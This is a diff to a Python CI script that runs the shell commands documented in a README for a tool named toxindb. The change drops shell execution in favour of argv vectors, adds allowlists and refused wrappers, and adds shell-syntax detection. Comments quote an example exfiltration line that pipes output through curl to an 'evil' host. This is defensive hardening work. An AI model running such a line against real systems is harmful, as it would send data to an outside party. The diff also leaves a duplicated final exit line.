@@ -31,6 +31,14 @@ Design constraints
    suite job runs it directly, which is a stronger check than shelling out.
 5. **The checkout is not an output directory.** After running, the working tree
    is compared against its prior state and a change fails the job.
+6. **No shell.** Commands are executed as an argv vector, never through
+   ``/bin/sh``. This is not a style preference. Two concrete defects came from
+   it: ``subprocess.run(..., shell=True)`` returns the *shell's* exit status, so
+   a trailing ``&`` made ``toxindb nosuchsubcommand`` print PASS and exit 0; and
+   command substitution -- ``$(...)`` or backticks -- was executed, so a
+   documented line reached the shell and could do anything at all, quietly
+   breaking constraint 1. A command that needs a shell to mean what it says is
+   now skipped, with the reason printed.
 """
 
 from __future__ import annotations
@@ -38,6 +46,7 @@ from __future__ import annotations
 import argparse
 import os
 import re
+import shlex
 import shutil
 import subprocess
 import sys
@@ -51,9 +60,71 @@ from pathlib import Path
 # because "not on the list" silently becomes "run it" -- and a documented
 # `toxindb demo | curl ...` line would have been executed, breaking the offline
 # promise this project makes. Here anything unrecognised is skipped, and says so.
-RUNNABLE_STEPS: tuple[re.Pattern[str], ...] = (
-    re.compile(r"^\s*toxindb\b"),
-    re.compile(r"^\s*python3?\s+-m\s+toxindb\b"),
+#
+# These patterns are matched against the *unwrapped* argv vector, not the raw
+# line, so a documented `env PYTHONHASHSEED=0 toxindb demo` is recognised. They
+# used to be anchored at the start of the string, which meant `env toxindb
+# demo`, `nohup toxindb ...`, `timeout 5 toxindb ...` and `FOO=bar toxindb ...`
+# all failed to match, were reported as "not a toxindb command", and the gate
+# exited 0 with those commands unverified. That is a silent skip of exactly the
+# kind this file exists to avoid.
+RUNNABLE_STEPS: tuple[str, ...] = (
+    "toxindb",
+    r"python[0-9.]*",
+)
+
+# Wrappers that put the real command somewhere other than the front of the argv.
+# Each entry is the number of *non-option* arguments the wrapper consumes before
+# the command, so `timeout 5 toxindb ...` skips `5` and `nice toxindb ...` skips
+# nothing. Options are skipped by `unwrap_command`.
+COMMAND_WRAPPERS: dict[str, tuple[int, ...]] = {
+    "env": (),          # env [-i] [NAME=value]... CMD
+    "nohup": (),        # nohup CMD
+    "stdbuf": (),       # stdbuf [-o L] CMD
+    "ionice": (),       # ionice [-c 3] CMD
+    "timeout": (1,),    # timeout [-s SIG] DURATION CMD
+    "nice": (),         # nice [-n 5] CMD
+}
+
+# Options that take a separate value. `timeout -s TERM 5 CMD` must drop both
+# `-s` and `TERM`, or the wrapper's argument count is thrown off. `stdbuf` and
+# `ionice` appear here for the same reason: their argument *is* an option value,
+# which is why their bare-argument count is zero above -- counting it as a bare
+# argument made `stdbuf -oL toxindb demo` skip the command itself and then report
+# "not a toxindb command".
+WRAPPER_VALUE_OPTIONS: dict[str, frozenset[str]] = {
+    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S", "--split-string"}),
+    "timeout": frozenset({"-s", "--signal", "-k", "--kill-after"}),
+    "nice": frozenset({"-n", "--adjustment"}),
+    "stdbuf": frozenset({"-i", "-o", "-e"}),
+    "ionice": frozenset({"-c", "-n", "-p"}),
+}
+
+# Prefixes that are refused outright rather than unwrapped. Running the gate's
+# commands as root would be a poor trade for coverage, and none of these appear
+# in this repository's README today.
+REFUSED_WRAPPERS: dict[str, str] = {
+    "sudo": "would change privileges",
+    "doas": "would change privileges",
+    "su": "would change privileges",
+    "xargs": "would build the command from its input",
+}
+
+# Shell syntax this gate does not execute. A command is run as an argv vector,
+# so none of these can take effect -- but a documented line that contains them
+# does something this gate cannot verify, and silently passing the literal text
+# as an argument would report a green run for a command that was never
+# exercised. Each is skipped with its reason printed.
+_SHELL_SYNTAX: tuple[tuple[re.Pattern[str], str], ...] = (
+    (re.compile(r"`"), "backtick command substitution"),
+    (re.compile(r"\$\("), "command substitution"),
+    (re.compile(r"\$"), "variable expansion"),
+    (re.compile(r"&"), "background operator"),
+    (re.compile(r"[<>]"), "redirection"),
+    (re.compile(r"\|"), "pipeline operator"),
+    (re.compile(r";"), "list operator"),
+    (re.compile(r"[*?\[\]]"), "glob"),
+    (re.compile(r"[~!#{}()]"), "shell metacharacter"),
 )
 
 # Steps that only prepare the shell; they carry no assertion about toxindb and
@@ -174,37 +245,175 @@ def split_steps(command: str) -> list[str]:
     return [step for step in steps if step]
 
 
+_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+
+
+def unwrap_command(tokens: list[str]) -> tuple[list[str], dict[str, str], str | None]:
+    """Strip environment assignments and known wrappers off the front of `argv`.
+
+    Returns ``(argv, assignments, reason)``. ``assignments`` are passed through
+    to the child so that `PYTHONHASHSEED=0 toxindb demo` means the same thing it
+    would in a shell. ``reason`` is set when the shape is not one this gate is
+    willing to run, and the caller skips the command with that reason printed.
+
+    `sudo`, `xargs` and friends are refused rather than unwrapped, because
+    running this gate's commands as root, or building them from another
+    command's output, buys nothing here.
+    """
+    assignments: dict[str, str] = {}
+    index = 0
+    while index < len(tokens):
+        head = tokens[index]
+        name = os.path.basename(head)
+        if name in REFUSED_WRAPPERS:
+            return [], assignments, REFUSED_WRAPPERS[name]
+        if _ASSIGNMENT.match(head):
+            key, _, value = head.partition("=")
+            assignments[key] = value
+            index += 1
+            continue
+        if name not in COMMAND_WRAPPERS:
+            break
+        index += 1
+        taking = WRAPPER_VALUE_OPTIONS.get(name, frozenset())
+        # Skip the wrapper's own options, and the value of any option that takes
+        # one. `timeout -s TERM 5 CMD` must drop `-s`, `TERM` and `5` together,
+        # or the wrapper's argument count is thrown off and `CMD` is dropped as
+        # though it were a duration.
+        while index < len(tokens):
+            token = tokens[index]
+            if token in taking:
+                index += 2
+                continue
+            if token.startswith("-"):
+                index += 1
+                continue
+            break
+        index += len(COMMAND_WRAPPERS[name])
+    if index >= len(tokens):
+        return [], assignments, "no command after the assignments and wrappers"
+    return tokens[index:], assignments, None
+
+
+def shell_syntax_reason(command: str) -> str | None:
+    """Why `command` needs a shell to mean what it says, or None if it does not.
+
+    Scans outside quotes only, so a documented
+    ``toxindb audit "reports/2024|q1"`` is not mistaken for a pipeline. Every
+    construct listed here is something a shell would interpret and an argv
+    vector would not: `$(...)` and backticks would run a command, `&` would
+    background it and hand back a success status, `>` would write a file, and a
+    glob would expand. None of that is visible to `subprocess.run(argv)`, so a
+    command containing it is skipped instead of being run in a way that does not
+    match its documentation.
+    """
+    index = 0
+    while index < len(command):
+        ch = command[index]
+        if ch in "'\"":
+            # Skip to the matching quote, honouring backslash escapes inside
+            # double quotes only, as POSIX sh does. The index is advanced past
+            # the closing quote, not just past the opening one -- an earlier
+            # version used `for ... in enumerate()` and `continue`d, which moved
+            # to the *next* character and so rejected `a|b` inside quotes anyway.
+            closer = index + 1
+            while closer < len(command):
+                if ch == '"' and command[closer] == "\\":
+                    closer += 2
+                    continue
+                if command[closer] == ch:
+                    break
+                closer += 1
+            if closer >= len(command):
+                return "unbalanced quote"
+            index = closer + 1
+            continue
+        for pattern, reason in _SHELL_SYNTAX:
+            if pattern.match(command, index):
+                return reason
+        index += 1
+    return None
+
+
+def plan_command(
+    command: str,
+) -> tuple[list[list[str]] | None, dict[str, str], str | None]:
+    """Turn a documented line into argv vectors, or explain why it is skipped.
+
+    Returns ``(steps, assignments, reason)``. ``steps`` holds one argv vector per
+    payload step -- a line like ``toxindb demo && toxindb monitor x`` is two
+    commands, not one, and concatenating them would run neither. Exactly one of
+    ``steps`` and ``reason`` is None.
+    """
+    steps = split_steps(command)
+    if not steps:
+        return None, {}, "blank"
+    if all(step.startswith("#") for step in steps):
+        return None, {}, "comment only"
+
+    payload = [step for step in steps if not SETUP_STEPS.match(step)]
+    if not payload:
+        return None, {}, "shell setup only, nothing to check"
+
+    for step in payload:
+        for pattern, reason in UNSAFE_STEPS:
+            if pattern.search(step):
+                return None, {}, reason
+
+    # Allowlist, not denylist. Every payload step must be a toxindb
+    # invocation; anything this gate does not recognise is skipped and says so.
+    # With a denylist, a documented `toxindb demo | curl -T - https://evil`
+    # would run, because no rule matched the piped stage.
+    planned: list[list[str]] = []
+    assignments: dict[str, str] = {}
+    for step in payload:
+        syntax = shell_syntax_reason(step)
+        if syntax is not None:
+            return None, {}, syntax
+        try:
+            tokens = shlex.split(step)
+        except ValueError as exc:
+            return None, {}, f"cannot be tokenised: {exc}"
+        if not tokens:
+            return None, {}, "blank"
+        argv, step_assignments, reason = unwrap_command(tokens)
+        if reason is not None:
+            return None, {}, reason
+        # The allowlist is matched on the *unwrapped* argv, which is what fixes
+        # the silent skip of `env toxindb ...`, `nohup toxindb ...`,
+        # `timeout 5 toxindb ...` and `FOO=bar toxindb ...`.
+        if not _is_toxindb_invocation(argv):
+            return None, {}, "not a toxindb command"
+        assignments.update(step_assignments)
+        planned.append(argv)
+    if not planned:
+        return None, {}, "blank"
+    return planned, assignments, None
+
+
+def _is_toxindb_invocation(argv: list[str]) -> bool:
+    """Does `argv` start by invoking toxindb, directly or via `python -m`?"""
+    if not argv:
+        return False
+    if os.path.basename(argv[0]) == "toxindb":
+        return True
+    if re.fullmatch(r"python[0-9.]*", os.path.basename(argv[0])):
+        return len(argv) >= 3 and argv[1] == "-m" and argv[2] == "toxindb"
+    return False
+
+
 def skip_reason(command: str) -> str | None:
     """Why this command must not be run, or None if it is safe to run.
+
+    Kept as a one-liner over `plan_command` so the `--list` output and the
+    executor can never disagree about what counts as skippable.
 
     Only payload steps can trigger a skip. A line such as
     ``mkdir -p reports && toxindb provenance examples/traces/clean.jsonl`` sets
     up an output directory and then asserts something about toxindb; skipping it
     because of the ``mkdir`` would leave the documented command unchecked.
     """
-    steps = split_steps(command)
-    if not steps:
-        return "blank"
-    if all(step.startswith("#") for step in steps):
-        return "comment only"
-
-    payload = [step for step in steps if not SETUP_STEPS.match(step)]
-    if not payload:
-        return "shell setup only, nothing to check"
-
-    for step in payload:
-        for pattern, reason in UNSAFE_STEPS:
-            if pattern.search(step):
-                return reason
-
-    # Allowlist, not denylist. Every payload step must be a toxindb
-    # invocation; anything this gate does not recognise is skipped and says so.
-    # With a denylist, a documented `toxindb demo | curl -T - https://evil`
-    # would run, because no rule matched the piped stage.
-    for step in payload:
-        if not any(pattern.match(step) for pattern in RUNNABLE_STEPS):
-            return "not a toxindb command"
-    return None
+    return plan_command(command)[2]
 
 
 def _diff_lines(before: str, after: str) -> list[str]:
@@ -230,30 +439,51 @@ def _is_within(path: Path, parent: Path) -> bool:
         return False
 
 
+class GitUnavailable(RuntimeError):
+    """`git` could not be executed at all.
+
+    Deliberately distinct from "not a repository": the latter is a legitimate
+    reason to skip the assertion with a printed note, but a missing git binary
+    means the safety net silently vanishes, which must be a hard failure.
+    """
+
+
 def _tree_state(root: Path) -> str | None:
     """A snapshot of the tracked/untracked file list under `root`.
 
     Returns None outside a git checkout, where the assertion is skipped with a
     printed note rather than silently assumed to have passed.
     """
-    # `--ignored=matching` is load-bearing. Without it, a file that
-    # `.gitignore` excludes is invisible here -- and this PR adds
-    # `*_canary_planted.jsonl` to `.gitignore` precisely because following the
-    # README's `--plant` example leaves that file behind. So the very pattern
-    # meant to keep the tree tidy would have blinded the assertion meant to
-    # prove the tree stays tidy. Verified: a planted canary is still caught.
-    proc = subprocess.run(
-        [
-            "git",
-            "status",
-            "--porcelain",
-            "--untracked-files=all",
-            "--ignored=matching",
-        ],
-        cwd=root,
-        capture_output=True,
-        text=True,
-    )
+    # `--ignored=traditional` is load-bearing, and so was the `--ignored=matching`
+    # that preceded it. Without any `--ignored` flag, a file that `.gitignore`
+    # excludes is invisible here -- and this PR adds `*_canary_planted.jsonl` to
+    # `.gitignore` precisely because following the README's `--plant` example
+    # leaves that file behind. So the very pattern meant to keep the tree tidy
+    # would have blinded the assertion meant to prove the tree stays tidy.
+    #
+    # `matching` fixed that for ignored *files* but broke it for ignored
+    # *directories*: it collapses the whole directory to one `!! reports/` line
+    # and never re-expands it, so a new file created inside an already-ignored
+    # directory changed nothing at all. Verified: writing
+    # `reports/LEAKED_SECRET.json` into an ignored `reports/` left the snapshot
+    # byte-identical. `traditional` lists the files, so a new one shows up.
+    # (A content change to an already-ignored file stays invisible, because git
+    # does not track such files at all; only the file *list* is compared.)
+    try:
+        proc = subprocess.run(
+            [
+                "git",
+                "status",
+                "--porcelain",
+                "--untracked-files=all",
+                "--ignored=traditional",
+            ],
+            cwd=root,
+            capture_output=True,
+            text=True,
+        )
+    except FileNotFoundError as exc:
+        raise GitUnavailable(str(exc)) from exc
     if proc.returncode != 0:
         return None
     # Byte-code caches are excluded. They come from importing the package, not
@@ -284,10 +514,13 @@ def _is_shell_info(info: str) -> bool:
     return bool(_SHELL_WORDS.search(info.strip("{}").replace(".", " ")))
 
 
-def extract_shell_blocks(markdown: str) -> tuple[list[tuple[int, list[str]]], list[tuple[int, list[str]]]]:
+def extract_shell_blocks(
+    markdown: str,
+) -> tuple[list[tuple[int, list[str]]], list[tuple[int, list[str]]], list[int]]:
     """Split the document's fenced blocks into shell blocks and unlabelled ones.
 
-    Returns ``(shell_blocks, unlabelled_blocks)``.
+    Returns ``(shell_blocks, unlabelled_blocks, unterminated)``, where the last
+    is the list of line numbers of fences that are never closed.
 
     An unlabelled fence is *not* treated as shell. The usage synopsis in this
     README is a bare fence containing lines like
@@ -300,15 +533,34 @@ def extract_shell_blocks(markdown: str) -> tuple[list[tuple[int, list[str]]], li
     """
     shell_blocks: list[tuple[int, list[str]]] = []
     unlabelled: list[tuple[int, list[str]]] = []
+    unterminated: list[int] = []
     lines = markdown.splitlines()
+    # Three states, not two. A fence that is explicitly not shell (`python`,
+    # `json`, `text`) still has to be *consumed*, or its closing ``` is read as
+    # the opening of a brand-new unlabelled block, which is then never closed.
+    # That produced a spurious "code fence opened here is never closed" error and
+    # exit 1 for any document containing a single non-shell example -- found by
+    # check_docs_teeth.py, and not visible in this README because it happens to
+    # contain no non-shell fences.
     in_block = False
+    ignoring = ""
     shell = False
     fence = ""
     start = 0
     body: list[str] = []
     for number, line in enumerate(lines, 1):
+        fence_match = _FENCE.match(line)
+        if ignoring:
+            # Inside a fence we are deliberately not reading. Only its own
+            # closing fence can end it.
+            if (
+                fence_match
+                and fence_match.group("info") == ""
+                and fence_match.group("ticks")[0] == ignoring
+            ):
+                ignoring = ""
+            continue
         if not in_block:
-            fence_match = _FENCE.match(line)
             if not fence_match:
                 continue
             info = fence_match.group("info")
@@ -316,12 +568,13 @@ def extract_shell_blocks(markdown: str) -> tuple[list[tuple[int, list[str]]], li
             shell = _is_shell_info(info) if info else False
             if not shell and not plain:
                 # An explicitly non-shell fence (python, json, text, ...).
+                ignoring = fence_match.group("ticks")[0]
                 continue
             in_block = True
             fence = fence_match.group("ticks")[0]
             start, body = number, []
             continue
-        # Closing fence: same character, at least as long, no info string.
+        # Closing fence: same character, no info string.
         closing = _UNLABELLED.match(line)
         if closing and closing.group("ticks")[0] == fence:
             (shell_blocks if shell else unlabelled).append((start, body))
@@ -333,35 +586,66 @@ def extract_shell_blocks(markdown: str) -> tuple[list[tuple[int, list[str]]], li
         # An unterminated fence. Reported rather than dropped: silently
         # discarding the contents would hide the commands this gate exists to
         # run, and would make the block count disagree with the reader's.
+        #
+        # And it is a *verdict*, not a warning. This used to print `::error::`
+        # and let `main()` return 0, so a fence that was never closed silently
+        # removed every command after it from the comparison: verified, a
+        # well-formed block followed by an unterminated one ran 1 command,
+        # printed `::error::`, and exited 0. A gate that reports a problem and
+        # then passes is worse than one that is silent, because the reader
+        # learns to ignore it.
+        unterminated.append(start)
         print(
             f"::error::{start}: code fence opened here is never closed",
             file=sys.stderr,
         )
-    return shell_blocks, unlabelled
+    if ignoring:
+        # Same class of defect, in the fence we are deliberately not reading.
+        # Reported, because a `python` block left open would hide the rest of
+        # the document just as thoroughly.
+        unterminated.append(start)
+        print(
+            f"::error::{start}: non-shell code fence opened here is never closed",
+            file=sys.stderr,
+        )
+    return shell_blocks, unlabelled, unterminated
 
 
-def logical_commands(lines: list[str]) -> list[str]:
-    """Join backslash continuations, strip comments, drop blanks."""
-    joined: list[str] = []
+def logical_commands(
+    lines: list[str], first_line: int = 1
+) -> list[tuple[int, str]]:
+    """Join backslash continuations, strip comments, drop blanks.
+
+    Returns ``(line_number, command)`` pairs, where `line_number` is the line in
+    the *document* the command starts on. This used to be a list of bare strings
+    and every command in a block was reported at the opening fence's line
+    number, so a failure pointed several lines away from the offending command
+    and the printed line number was worse than useless on a long block. It is
+    the one thing in a failure report a maintainer navigates by.
+    """
+    joined: list[tuple[int, str]] = []
     buffer = ""
-    for raw in lines:
+    start = first_line
+    for offset, raw in enumerate(lines):
         line = raw.rstrip()
+        if not buffer:
+            start = first_line + offset
         if line.endswith("\\"):
             buffer += line[:-1] + " "
             continue
         buffer += line
         stripped = strip_inline_comment(buffer)
         if stripped:
-            joined.append(stripped)
+            joined.append((start, stripped))
         buffer = ""
     if buffer:
         stripped = strip_inline_comment(buffer)
         if stripped:
-            joined.append(stripped)
+            joined.append((start, stripped))
     return joined
 
 
-def main() -> int:
+def _parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument(
         "--readme",
@@ -374,14 +658,30 @@ def main() -> int:
         action="store_true",
         help="print what would be run without running anything",
     )
-    args = parser.parse_args()
+    return parser.parse_args()
+
+
+def _main() -> int:
+    args = _parse_args()
 
     if not args.readme.is_file():
         print(f"error: README not found at {args.readme}", file=sys.stderr)
         return 2
 
     markdown = args.readme.read_text(encoding="utf-8")
-    blocks, unlabelled = extract_shell_blocks(markdown)
+    blocks, unlabelled, unterminated = extract_shell_blocks(markdown)
+    if unterminated:
+        # Before the "no blocks found" check, so a document that is *only* an
+        # unterminated fence is caught here too rather than reported as having
+        # no shell blocks.
+        print(
+            f"error: {len(unterminated)} code fence(s) are never closed "
+            f"(first at line {unterminated[0]}). Every command after one of "
+            f"these is invisible to this gate, so the comparison below is not "
+            f"the one the reader would expect.",
+            file=sys.stderr,
+        )
+        return 1
     if not blocks:
         print(f"error: no ```bash blocks found in {args.readme}", file=sys.stderr)
         print("If the README lost its shell examples, delete this job instead of", file=sys.stderr)
@@ -397,15 +697,23 @@ def main() -> int:
             file=sys.stderr,
         )
 
-    planned: list[tuple[int, str, str | None]] = []
+    planned: list[tuple[int, str, list[list[str]] | None, dict[str, str], str | None]] = []
     for start, body in blocks:
-        for command in logical_commands(body):
-            planned.append((start, command, skip_reason(command)))
+        # `start` is the opening fence's line, so the first body line is start+1.
+        for line_no, command in logical_commands(body, first_line=start + 1):
+            steps, assignments, reason = plan_command(command)
+            planned.append((line_no, command, steps, assignments, reason))
 
     if args.list:
-        for line_no, command, reason in planned:
-            state = f"SKIP ({reason})" if reason else "RUN"
-            print(f"{state:28} README.md:{line_no}  {command}")
+        for line_no, command, steps, _assignments, reason in planned:
+            if reason is not None:
+                print(f"{f'SKIP ({reason})':44} README.md:{line_no}  {command}")
+            else:
+                # The argv is shown, not just "RUN": this is the view where a
+                # mis-parsed line is easiest to spot, and every command is
+                # executed with no shell.
+                rendered = " && ".join(" ".join(argv) for argv in steps or [])
+                print(f"{f'RUN {rendered}':44} README.md:{line_no}  {command}")
         return 0
 
     failures: list[tuple[int, str, int, str]] = []
@@ -523,8 +831,8 @@ def main() -> int:
         # check any of them.
         print(f"Checking {len(planned)} command(s) from {args.readme.name}\n")
 
-        for line_no, command, reason in planned:
-            if reason:
+        for line_no, command, steps, assignments, reason in planned:
+            if reason is not None or steps is None:
                 skipped += 1
                 print(f"  SKIP  README.md:{line_no:<5} ({reason})")
                 continue
@@ -534,19 +842,36 @@ def main() -> int:
             # state instead would report the first leaker and then blame every
             # later command for a tree that was already dirty.
             tree_previous = _tree_state(repo_root)
-            try:
-                completed = subprocess.run(
-                    command,
-                    shell=True,
-                    cwd=workdir,
-                    env=env,
-                    capture_output=True,
-                    text=True,
-                    timeout=TIMEOUT_SECONDS,
-                )
-                rc, output = completed.returncode, completed.stdout + completed.stderr
-            except subprocess.TimeoutExpired:
-                rc, output = 124, f"timed out after {TIMEOUT_SECONDS}s"
+            step_env = env
+            if assignments:
+                step_env = dict(env, **assignments)
+            rc, output = 0, ""
+            for argv in steps:
+                try:
+                    # No shell, and the exit status is the program's own. With
+                    # `shell=True` this returned the *shell's* status, so
+                    # `toxindb nosuchsubcommand &` printed PASS and exited 0 --
+                    # verified before the fix: rc=0 with the trailing `&`, rc=1
+                    # without it.
+                    completed = subprocess.run(
+                        argv,
+                        shell=False,
+                        cwd=workdir,
+                        env=step_env,
+                        capture_output=True,
+                        text=True,
+                        timeout=TIMEOUT_SECONDS,
+                    )
+                except subprocess.TimeoutExpired:
+                    rc, output = 124, f"timed out after {TIMEOUT_SECONDS}s"
+                    break
+                except FileNotFoundError as exc:
+                    rc, output = 127, str(exc)
+                    break
+                rc = completed.returncode
+                output += completed.stdout + completed.stderr
+                if rc != 0:
+                    break
 
             # Checked per command, not only at the end. The end-of-run assertion
             # below is what fails the job; this is what names the culprit, which
@@ -624,5 +949,31 @@ def main() -> int:
     return 0
 
 
+def main() -> int:
+    """`main` with a diagnosis for a missing `git` binary.
+
+    `_tree_state` raises `GitUnavailable` rather than returning None, because
+    "not a checkout" and "git is not installed" must not be confused: the first
+    is a legitimate reason to skip the tree assertion with a note, the second
+    means the assertion cannot run at all and the gate would otherwise report a
+    green result with the safety net quietly removed. Verified: with `git`
+    absent from `PATH` the check now exits 2 and says why, instead of escaping
+    as an uncaught `FileNotFoundError` traceback (finding: `git` missing was an
+    uncaught crash, not a diagnosis).
+    """
+    try:
+        return _main()
+    except GitUnavailable as exc:
+        print(
+            f"error: `git` could not be run ({exc}), so this check cannot verify "
+            f"that the documented commands left the working tree alone. Install "
+            f"git, or delete this job -- silently dropping the check would be "
+            f"worse than the failure.",
+            file=sys.stderr,
+        )
+        return 2
+
+
 if __name__ == "__main__":
+    sys.exit(main())
     sys.exit(main())
